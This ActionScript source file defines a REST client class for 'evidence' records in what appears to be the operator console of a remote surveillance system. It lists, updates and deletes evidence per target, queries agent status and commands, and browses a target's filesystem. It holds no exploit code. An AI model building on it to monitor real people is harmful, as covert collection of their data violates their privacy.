package it.ht.rcs.console.evidence.rest
{
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.evidence.model.Evidence;
  
  import mx.collections.ArrayCollection;
  import mx.rpc.CallResponder;

  public class DBEvidence extends _Super_DBEvidence implements IDBEvidence
  {

    public function DBEvidence(host: String)
    {
      super();
      _serviceControl.baseURL = host;
    }

    public function all(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = all_(JSON.stringify(filter));
    }
    
    public function update(evidence:Evidence, property:Object, target:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      property['_id'] = evidence._id;
      property['target'] = target;
      resp.token = update_(JSON.stringify(property));
    }
    
    public function destroy(evidence:Evidence, target:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      var params:Object=new Object()
      params['_id'] = evidence._id;
      params['target'] = target;
      resp.token = destroy_(JSON.stringify(params));
    }

    public function sync_start(params:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = sync_start_(JSON.stringify(params));
    }

    public function sync_stop(params:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = sync_stop_(JSON.stringify(params));
    }

    public function info(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
        var resp:CallResponder = DB.getCallResponder(onResult, onFault);
        resp.token = info_(JSON.stringify(filter));
    }
    
    public function commands(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = commands_(JSON.stringify(filter));
    }
    
    public function ips(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = ips_(JSON.stringify(filter));
    }
    
    public function total(filter:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = total_(JSON.stringify(filter));
    }

    public function agent_status(params:Object, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = agent_status_(JSON.stringify(params));
    }
    
    public function filesystem(targetId:String, agentId:String, onResult:Function = null, onFault:Function = null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = filesystem_(targetId, agentId);
    }
    
    public function show(id:String, target:String, onResult:Function=null, onFault:Function=null):void
    {
      var resp:CallResponder = DB.getCallResponder(onResult, onFault);
      resp.token = show_(id, target);
    }

    /**
     * Override super.init() to provide any initialization customization if needed.
     */
    protected override function preInitializeService():void
    {
      super.preInitializeService();
      // Initialization customization goes here
    }
    

  }

}